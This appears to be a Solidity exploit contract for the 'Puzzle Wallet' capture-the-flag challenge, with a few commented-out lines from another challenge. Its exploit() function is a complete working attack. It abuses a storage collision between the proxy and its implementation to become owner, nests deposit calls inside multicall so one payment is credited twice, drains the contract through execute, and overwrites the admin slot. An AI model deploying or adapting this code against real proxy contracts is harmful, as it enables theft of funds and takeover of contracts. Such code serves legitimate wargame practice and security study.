// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.19;

import "exploit_templates/Destructible.sol";
import "exploit_templates/Targeted.sol";

abstract contract PuzzleProxy {
    address public pendingAdmin;
    address public admin;

    function proposeNewAdmin(address) external virtual;

    function approveNewAdmin(address) external virtual;

    function upgradeTo(address) external virtual;

    function setMaxBalance(uint256) external virtual;

    function addToWhitelist(address) external virtual;

    function deposit() external payable virtual;

    function execute(address, uint256, bytes calldata) external payable virtual;

    function multicall(bytes[] calldata) external payable virtual;
}


contract ExpPuzzleWallet is Destructible, Targeted {
    uint256 kill_value = 100000000000000;

    constructor(address target_addr, uint256 kill_val) payable Targeted(target_addr) {
        kill_value = kill_val;
    }

    receive() external payable {

    }

    function toUint(address self) internal pure returns(uint256) {
        return uint256(uint160(self));
    }

    function exploit() public payable {
        /* ContractTarget.call(abi.encodeWithSignature("withdraw(uint256)",1000000000000000)); */
        // expcon.call(abi.encodeWithSignature("requestDonation()"));
        // GoodSamaritan ctrct = GoodSamaritan(0x56D461c8cF56e1DeEC300e8B42631f483c2ff9af);
        // ctrct.requestDonation();
        PuzzleProxy proxy = PuzzleProxy(Targeted(this).target());
        proxy.proposeNewAdmin(address(this));
        proxy.addToWhitelist(address(this));

        bytes memory deposit_call = abi.encodeWithSignature("deposit()");

        bytes[] memory inner = new bytes[](1);
        inner[0] = deposit_call;
        bytes memory multi_call = abi.encodeWithSignature("multicall(bytes[])", inner);

        bytes[] memory outer = new bytes[](2);
        outer[0] = deposit_call;
        outer[1] = multi_call;

        proxy.multicall{value: kill_value}(outer);
        proxy.execute(address(this), kill_value * 2, "");
        proxy.setMaxBalance(toUint(Destructible(this).owner()));
        return;
    }
}